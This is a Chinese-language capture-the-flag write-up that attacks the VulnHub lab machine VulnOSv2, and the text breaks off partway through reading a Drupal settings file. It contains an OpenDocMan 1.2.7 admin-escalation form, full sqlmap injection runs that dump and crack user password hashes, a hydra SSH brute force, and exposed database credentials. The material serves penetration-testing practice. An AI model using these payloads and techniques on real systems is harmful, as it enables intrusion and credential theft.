# 1. Preface
一年一度的HW已经进行了三分之一，为了对得起朋友的信任，最近大多数的时间和精力花费在某单位的日常HW中，尤其是刚刚开始的这一个周，真是感觉百废待兴，有很多从零开始的工作，有很多辛苦的日夜，也有沿途美丽的风景(独库公路北段)；待到大多数的事情已经做了七七八八的时候，虽然仍不能放松警惕，但终于有些许的喘息时间静下心来打打靶机，继续未完成的修行之路。这个靶机叫做VulnsOSv2，下载链接：https://www.vulnhub.com/entry/vulnos-2,147/；
这个靶机整体做第一遍的时候感觉一般(自己的解题思路中规中矩)，深入了解一下别人的思路的时候，才深刻了解到靶机作者的奇妙构思(第二种解题思路)，也体会到渗透是一件充满艺术挑战的事情。
最后引用别人的一句话，也是自己的心里话：Thanks to the people who helped me to get so far!!!

# 2. Information Gathering
## 2.1 nmap 探测端、服务、版本、常见漏洞
<details>
<summary>nmap扫描</summary>
<pre>

```shell
┌──(root㉿kali)-[/VulnOSv2]
└─# cat 192.168.3.214.txt
# Nmap 7.92 scan initiated Wed Jul 27 22:29:50 2022 as: nmap -sT -p- -A -sC -Pn -T5 -oN 192.168.3.214.txt 192.168.3.214
Warning: 192.168.3.214 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.3.214
Host is up (0.013s latency).
Not shown: 65379 closed tcp ports (conn-refused), 153 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
MAC Address: A4:5E:60:C2:D9:0B (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   13.25 ms 192.168.3.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 27 22:30:27 2022 -- 1 IP address (1 host up) scanned in 37.78 seconds
```
</details>

## 2.2 web服务
<p>通过浏览主页发现目录--/jabc</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/1.png" width="56%" ></br>

<p>目录--/jabcd0cs，而且使用了opendocman文档管理系统，这里比较坑的是文档介绍这里，如果不去查看源代码或者Ctrl+a选择一下页面是看不到页面的内容的，因为字体颜色和背景颜色都是黑色的：</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/2.png" width="56%" ></br>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/3.png" width="56%" ></br>

### 2.2.1 文件上传，可惜不能执行
<p>使用guest账号进行登录的时候，发现php文件是可以上传成功的，可惜不能让服务器执行，浏览器下载了文件</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/4.png" width="56%" ></br>

### 2.2.2 网站目录扫描
分别对/jabc和/jabcd0cs两个目录进行扫描：
<details>
<summary>dirb扫描</summary>
<pre>

```shell
┌──(root㉿kali)-[/VulnOSv2]
└─# cat dirb_jabc_192.168.3.231.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_192.168.3.231.txt
START_TIME: Sun Jul 31 12:04:26 2022
URL_BASE: http://192.168.3.231/jabc/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.3.231/jabc/ ----
==> DIRECTORY: http://192.168.3.231/jabc/includes/
+ http://192.168.3.231/jabc/index.php (CODE:200|SIZE:9498)
==> DIRECTORY: http://192.168.3.231/jabc/misc/
==> DIRECTORY: http://192.168.3.231/jabc/modules/
==> DIRECTORY: http://192.168.3.231/jabc/profiles/
+ http://192.168.3.231/jabc/robots.txt (CODE:200|SIZE:1561)
==> DIRECTORY: http://192.168.3.231/jabc/scripts/
==> DIRECTORY: http://192.168.3.231/jabc/sites/
==> DIRECTORY: http://192.168.3.231/jabc/templates/
==> DIRECTORY: http://192.168.3.231/jabc/themes/
+ http://192.168.3.231/jabc/xmlrpc.php (CODE:200|SIZE:42)

---- Entering directory: http://192.168.3.231/jabc/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/profiles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/sites/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabc/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sun Jul 31 12:04:58 2022
DOWNLOADED: 4612 - FOUND: 3

┌──(root㉿kali)-[/VulnOSv2]
└─# cat dirb_jabcd0cs_192.168.3.231.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_jabcd0cs_192.168.3.231.txt
START_TIME: Sun Jul 31 12:08:49 2022
URL_BASE: http://192.168.3.231/jabcd0cs/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.3.231/jabcd0cs/ ----
+ http://192.168.3.231/jabcd0cs/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.3.231/jabcd0cs/docs/
==> DIRECTORY: http://192.168.3.231/jabcd0cs/images/
==> DIRECTORY: http://192.168.3.231/jabcd0cs/includes/
+ http://192.168.3.231/jabcd0cs/index.php (CODE:200|SIZE:5579)
+ http://192.168.3.231/jabcd0cs/magic (CODE:200|SIZE:13075)
+ http://192.168.3.231/jabcd0cs/README (CODE:200|SIZE:2202)
==> DIRECTORY: http://192.168.3.231/jabcd0cs/reports/
==> DIRECTORY: http://192.168.3.231/jabcd0cs/templates/
==> DIRECTORY: http://192.168.3.231/jabcd0cs/templates_c/
==> DIRECTORY: http://192.168.3.231/jabcd0cs/uploads/

---- Entering directory: http://192.168.3.231/jabcd0cs/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/reports/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/templates/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/templates_c/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.3.231/jabcd0cs/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sun Jul 31 12:09:22 2022
DOWNLOADED: 4612 - FOUND: 4
```
</details>
<p>虽然有很多目录都是可以直接列出文件的，但是翻了半天没有发现有用的信息，大多数的.inc文件翻了一下发现太久不看代码，有些看不懂 :sob: 唯一看到一个有用的目录/jabc/sites/default/，还不能查看源代码：</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/5.png" width="56%" ></br>

# 3. Vulnerability Analysis
由于通过目录遍历没有找到有用的信息，尝试通过DMS--opendocman进行突破：
```shell
┌──(root㉿kali)-[/VulnOSv2]
└─# searchsploit opendocman 1.2.7
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenDocMan 1.2.7 - Multiple Vulnerabilities                                                                                                                                         | php/webapps/32075.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
┌──(root㉿kali)-[/VulnOSv2]
└─# searchsploit -p php/webapps/32075.txt
  Exploit: OpenDocMan 1.2.7 - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/32075
     Path: /usr/share/exploitdb/exploits/php/webapps/32075.txt
File Type: Unicode text, UTF-8 text
```

## 3.1 文件上传
虽然使用guest/guest能够成功登录网站，网站也提示网站管理员可以修改可上传的文件类型，然而，通过opendocman的漏洞将guest添加到管理员后，对于上传的文件能够被服务器解析仍然没有什么用处，结合/jabcd0cs/uploads/目录，发现上传的文件都变成了.dat的格式：
```html
<form action="http://192.168.3.231/jabcd0cs/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="2">
<input type="submit" name="login" value="Run">
</form>
```
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/6.png" width="56%" ></br>

<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/7.png" width="56%" ></br>

<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/8.png" width="56%" ></br>

<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/10.png" width="56%" ></br>

## 3.2 SQL注入
我们来尝试一下SQL注入：
<details>
<summary>sqlmap注入测试</summary>
<pre>

```shell
┌──(root㉿kali)-[/VulnOSv2]
└─# sqlmap -u "http://192.168.3.231/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level 5 --risk 3 --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:00:28 /2022-07-31/

[18:00:28] [INFO] resuming back-end DBMS 'mysql'
[18:00:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: add_value (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1&add_value=odm_user WHERE 3513=3513 AND 4386=4386-- bfxE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=1&add_value=odm_user WHERE 6216=6216 AND (SELECT 2470 FROM (SELECT(SLEEP(5)))pVeC)-- RvJp
---
[18:00:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[18:00:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.3.231'

[*] ending @ 18:00:30 /2022-07-31/


┌──(root㉿kali)-[/VulnOSv2]
└─# sqlmap -u "http://192.168.3.231/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level 5 --risk 3 --batch --current-user --current-db
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:01:02 /2022-07-31/

[18:01:02] [INFO] resuming back-end DBMS 'mysql'
[18:01:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: add_value (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1&add_value=odm_user WHERE 3513=3513 AND 4386=4386-- bfxE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=1&add_value=odm_user WHERE 6216=6216 AND (SELECT 2470 FROM (SELECT(SLEEP(5)))pVeC)-- RvJp
---
[18:01:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[18:01:02] [INFO] fetching current user
[18:01:02] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:01:02] [INFO] retrieved:
[18:01:03] [WARNING] reflective value(s) found and filtering out
root@localhost
current user: 'root@localhost'
[18:01:05] [INFO] fetching current database
[18:01:05] [INFO] retrieved: jabcd0cs
current database: 'jabcd0cs'
[18:01:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.3.231'

[*] ending @ 18:01:06 /2022-07-31/


┌──(root㉿kali)-[/VulnOSv2]
└─# sqlmap -u "http://192.168.3.231/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level 5 --risk 3 --batch -D jabcd0cs --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:01:51 /2022-07-31/

[18:01:51] [INFO] resuming back-end DBMS 'mysql'
[18:01:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: add_value (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1&add_value=odm_user WHERE 3513=3513 AND 4386=4386-- bfxE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=1&add_value=odm_user WHERE 6216=6216 AND (SELECT 2470 FROM (SELECT(SLEEP(5)))pVeC)-- RvJp
---
[18:01:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[18:01:51] [INFO] fetching tables for database: 'jabcd0cs'
[18:01:51] [INFO] fetching number of tables for database 'jabcd0cs'
[18:01:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:01:51] [INFO] retrieved:
[18:01:51] [WARNING] reflective value(s) found and filtering out
15
[18:01:51] [INFO] retrieved: odm_access_log
[18:01:54] [INFO] retrieved: odm_admin
[18:01:55] [INFO] retrieved: odm_category
[18:01:56] [INFO] retrieved: odm_data
[18:01:57] [INFO] retrieved: odm_department
[18:01:58] [INFO] retrieved: odm_dept_perms
[18:02:00] [INFO] retrieved: odm_dept_reviewer
[18:02:01] [INFO] retrieved: odm_filetypes
[18:02:03] [INFO] retrieved: odm_log
[18:02:03] [INFO] retrieved: odm_odmsys
[18:02:05] [INFO] retrieved: odm_rights
[18:02:06] [INFO] retrieved: odm_settings
[18:02:07] [INFO] retrieved: odm_udf
[18:02:08] [INFO] retrieved: odm_user
[18:02:08] [INFO] retrieved: odm_user_perms
Database: jabcd0cs
[15 tables]
+-------------------+
| odm_access_log    |
| odm_admin         |
| odm_category      |
| odm_data          |
| odm_department    |
| odm_dept_perms    |
| odm_dept_reviewer |
| odm_filetypes     |
| odm_log           |
| odm_odmsys        |
| odm_rights        |
| odm_settings      |
| odm_udf           |
| odm_user          |
| odm_user_perms    |
+-------------------+

[18:02:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.3.231'

[*] ending @ 18:02:10 /2022-07-31/


┌──(root㉿kali)-[/VulnOSv2]
└─# sqlmap -u "http://192.168.3.231/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -p add_value --level 5 --risk 3 --batch -D jabcd0cs -T odm_user --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:02:34 /2022-07-31/

[18:02:34] [INFO] resuming back-end DBMS 'mysql'
[18:02:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: add_value (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=1&add_value=odm_user WHERE 3513=3513 AND 4386=4386-- bfxE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=1&add_value=odm_user WHERE 6216=6216 AND (SELECT 2470 FROM (SELECT(SLEEP(5)))pVeC)-- RvJp
---
[18:02:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[18:02:34] [INFO] fetching columns for table 'odm_user' in database 'jabcd0cs'
[18:02:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:02:34] [INFO] retrieved:
[18:02:34] [WARNING] reflective value(s) found and filtering out
9
[18:02:34] [INFO] retrieved: id
[18:02:35] [INFO] retrieved: username
[18:02:36] [INFO] retrieved: password
[18:02:38] [INFO] retrieved: department
[18:02:39] [INFO] retrieved: phone
[18:02:40] [INFO] retrieved: Email
[18:02:41] [INFO] retrieved: last_name
[18:02:43] [INFO] retrieved: first_name
[18:02:44] [INFO] retrieved: pw_reset_code
[18:02:46] [INFO] fetching entries for table 'odm_user' in database 'jabcd0cs'
[18:02:46] [INFO] fetching number of entries for table 'odm_user' in database 'jabcd0cs'
[18:02:46] [INFO] retrieved: 2
[18:02:47] [INFO] retrieved: webmin@example.com
[18:02:49] [INFO] retrieved: 2
[18:02:49] [INFO] retrieved: web
[18:02:50] [INFO] retrieved: 1
[18:02:50] [INFO] retrieved: min
[18:02:51] [INFO] retrieved: b78aae356709f8c31118ea613980954b
[18:02:56] [INFO] retrieved: 5555551212
[18:02:58] [INFO] retrieved:
[18:02:58] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[18:02:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

[18:02:59] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[18:02:59] [INFO] retrieved: webmin
[18:03:00] [INFO] retrieved: guest@example.com
[18:03:06] [INFO] retrieved: 2
[18:03:06] [INFO] retrieved: guest
[18:03:07] [INFO] retrieved: 2
[18:03:07] [INFO] retrieved: guest
[18:03:09] [INFO] retrieved: 084e0343a0486ff05530df6c705c8bb4
[18:03:15] [INFO] retrieved: 555 5555555
[18:03:17] [INFO] retrieved:
[18:03:17] [INFO] retrieved: guest
[18:03:18] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:03:18] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[18:03:18] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[18:03:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[18:03:18] [INFO] starting 8 processes
[18:03:20] [INFO] cracked password 'guest' for user 'guest'
Database: jabcd0cs
Table: odm_user
[2 entries]
+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
| id | Email              | phone       | password                                 | username | last_name | department | first_name | pw_reset_code |
+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
| 1  | webmin@example.com | 5555551212  | b78aae356709f8c31118ea613980954b         | webmin   | min       | 2          | web        | <blank>       |
| 2  | guest@example.com  | 555 5555555 | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest    | guest     | 2          | guest      | NULL          |
+----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+

[18:03:21] [INFO] table 'jabcd0cs.odm_user' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.3.231/dump/jabcd0cs/odm_user.csv'
[18:03:21] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.3.231'

[*] ending @ 18:03:21 /2022-07-31/
```
</details>
<p>拿到hash值之后，一般用在线解密网站去解密，当然也可以hashcat进行撞库(保证你的字典够强才行)，得到两个账号：guest/guest、webmin/webmin1980。
使用webmin登陆一下网站：</p>
<img src="https://github.com/eagleatman/mywriteup/blob/main/vulnsOs2/images/9.png" width="56%" ></br>
但是一样的结果虽然能够上传.php文件，依然是无法让它在服务端执行。

# 4. Exploitation
由于靶机开启了ssh服务，因此考虑使用这两个账号进行ssh登录一下。
## 4.1 通过mysql用户和密码信息登录SSH获取到shell
```shell
┌──(root㉿kali)-[/VulnOSv2]
└─# hydra -L user.txt -P passwd.txt ssh://192.168.3.231:22
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-31 21:26:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
[DATA] attacking ssh://192.168.3.231:22/
[22][ssh] host: 192.168.3.231   login: webmin   password: webmin1980
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-31 21:26:27
```
成功拿到一个ssh shell。看一下/jabc/sites/default/
<details>
<summary>读取一下dbconfig.php、	settings.php文件中的内容</summary>
<pre>

```shell
webmin@VulnOSv2:/var/www/html/jabc/sites/default$ cat dbconfig.php
<?php
#
# database access settings in php format
# automatically generated from /etc/dbconfig-common/drupal7.conf
# by /usr/sbin/dbconfig-generate-include
#
# by default this file is managed via ucf, so you shouldn't have to
# worry about manual changes being silently discarded.  *however*,
# you'll probably also want to edit the configuration file mentioned
# above too.

$databases['default']['default'] = array(
	'driver' => 'mysql',
	'database' => 'drupal7',
	'username' => 'drupal7',
	'password' => 'toor',
	'host' => 'localhost',
	'port' => '',
	'prefix' => ''
);

?>
webmin@VulnOSv2:/var/www/html/jabc/sites/default$ cat settings.php
<?php
// $Id: default.settings.php,v 1.51 2010/10/11 23:49:48 dries Exp $

/**
 * @file
 * Drupal site-specific configuration file.
 *
 * IMPORTANT NOTE:
 * This file may have been set to read-only by the Drupal installation
 * program. If you make changes to this file, be sure to protect it again
 * after making your modifications. Failure to remove write permissions
 * to this file is a security risk.
 *
 * The configuration file to be loaded is based upon the rules below.
 *
 * The configuration directory will be discovered by stripping the
 * website's hostname from left to right and pathname from right to
 * left. The first configuration file found will be used and any
 * others will be ignored. If no other configuration file is found
 * then the default configuration file at 'sites/default' will be used.
 *
 * For example, for a fictitious site installed at
 * http://www.drupal.org/mysite/test/, the 'settings.php'
 * is searched in the following directories:
 *
 *  1. sites/www.drupal.org.mysite.test
 *  2. sites/drupal.org.mysite.test
 *  3. sites/org.mysite.test
 *
 *  4. sites/www.drupal.org.mysite
 *  5. sites/drupal.org.mysite
 *  6. sites/org.mysite
 *
 *  7. sites/www.drupal.org
 *  8. sites/drupal.org
 *  9. sites/org
 *
 * 10. sites/default
 *
 * If you are installing on a non-standard port number, prefix the
 * hostname with that number. For example,
 * http://www.drupal.org:8080/mysite/test/ could be loaded from
 * sites/8080.www.drupal.org.mysite.test/.
 */

/**
 * Database settings:
 *
 * The $databases array specifies the database connection or
 * connections that Drupal may use.  Drupal is able to connect
 * to multiple databases, including multiple types of databases,
 * during the same request.
 *
 * Each database connection is specified as an array of settings,
 * similar to the following:
 * @code
 * array(
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'port' => 3306,
 *   'prefix' => 'myprefix_',
 *   'collation' => 'utf8_general_ci',
 * );
 * @endcode
 *
 * The "driver" property indicates what Drupal database driver the
 * connection should use.  This is usually the same as the name of the
 * database type, such as mysql or sqlite, but not always.  The other
 * properties will vary depending on the driver.  For SQLite, you must
 * specify a database file name in a directory that is writable by the
 * webserver.  For most other drivers, you must specify a
 * username, password, host, and database name.
 *
 * Some database engines support transactions.  In order to enable
 * transaction support for a given database, set the 'transactions' key
 * to TRUE.  To disable it, set it to FALSE.  Note that the default value
 * varies by driver.  For MySQL, the default is FALSE since MyISAM tables
 * do not support transactions.
 *
 * For each database, you may optionally specify multiple "target" databases.
 * A target database allows Drupal to try to send certain queries to a
 * different database if it can but fall back to the default connection if not.
 * That is useful for master/slave replication, as Drupal may try to connect
 * to a slave server when appropriate and if one is not available will simply
 * fall back to the single master server.
 *
 * The general format for the $databases array is as follows:
 * @code
 * $databases['default']['default'] = $info_array;
 * $databases['default']['slave'][] = $info_array;
 * $databases['default']['slave'][] = $info_array;
 * $databases['extra']['default'] = $info_array;
 * @endcode
 *
 * In the above example, $info_array is an array of settings described above.
 * The first line sets a "default" database that has one master database
 * (the second level default).  The second and third lines create an array
 * of potential slave databases.  Drupal will select one at random for a given
 * request as needed.  The fourth line creates a new database with a name of
 * "extra".
 *
 * For a single database configuration, the following is sufficient:
 * @code
 * $databases['default']['default'] = array(
 *   'driver' => 'mysql',
 *   'database' => 'databasename',
 *   'username' => 'username',
 *   'password' => 'password',
 *   'host' => 'localhost',
 *   'prefix' => 'main_',
 *   'collation' => 'utf8_general_ci',
 * );
 * @endcode
 *
 * You can optionally set prefixes for some or all database table names
 * by using the 'prefix' setting. If a prefix is specified, the table
 * name will be prepended with its value. Be sure to use valid database
 * characters only, usually alphanumeric and underscore. If no prefixes
 * are desired, leave it as an empty string ''.
 *
 * To have all database names prefixed, set 'prefix' as a string:
 * @code
 *   'prefix' => 'main_',
 * @endcode
 * To provide prefixes for specific tables, set 'prefix' as an array.
 * The array's keys are the table names and the values are the prefixes.
 * The 'default' element is mandatory and holds the prefix for any tables
 * not specified elsewhere in the array. Example:
 * @code
 *   'prefix' => array(
 *     'default'   => 'main_',
 *     'users'     => 'shared_',
 *     'sessions'  => 'shared_',
 *     'role'      => 'shared_',
 *     'authmap'   => 'shared_',
 *   ),
 * @endcode
 * You can also use a reference to a schema/database as a prefix. This maybe
 * useful if your Drupal installation exists in a schema that is not the default
 * or you want to access several databases from the same code base at the same
 * time.
 * Example:
 * @code
 *   'prefix' => array(
 *     'default'   => 'main.',
 *     'users'     => 'shared.',
 *     'sessions'  => 'shared.',
 *     'role'      => 'shared.',
 *     'authmap'   => 'shared.',
 *   );
 * @endcode
 * NOTE: MySQL and SQLite's definition of a schema is a database.
 *
 * Database configuration format:
 * @code
 *   $databases['default']['default'] = array(
 *     'driver' => 'mysql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *   );
 *   $databases['default']['default'] = array(
 *     'driver' => 'pgsql',
 *     'database' => 'databasename',
 *     'username' => 'username',
 *     'password' => 'password',
 *     'host' => 'localhost',
 *     'prefix' => '',
 *   );
 *   $databases['default']['default'] = array(
 *     'driver' => 'sqlite',
 *     'database' => '/path/to/databasefilename',
 *   );
 * @endcode
 */
$databases = array();
require_once('dbconfig.php');

/**
 * Access control for update.php script.
 *
 * If you are updating your Drupal installation using the update.php script but
 * are not logged in using either an account with the "Administer software
 * updates" permission or the site maintenance account (the account that was
 * created during installation), you will need to modify the access check
 * statement below. Change the FALSE to a TRUE to disable the access check.
 * After finishing the upgrade, be sure to open this file again and change the
 * TRUE back to a FALSE!
 */
$update_free_access = FALSE;

/**
 * Salt for one-time login links and cancel links, form tokens, etc.
 *
 * This variable will be set to a random value by the installer. All one-time
 * login links will be invalidated if the value is changed.  Note that this
 * variable must have the same value on every web server.  If this variable is
 * empty, a hash of the serialized database credentials will be used as a
 * fallback salt.
 *
 * For enhanced security, you may set this variable to a value using the
 * contents of a file outside your docroot that is never saved together
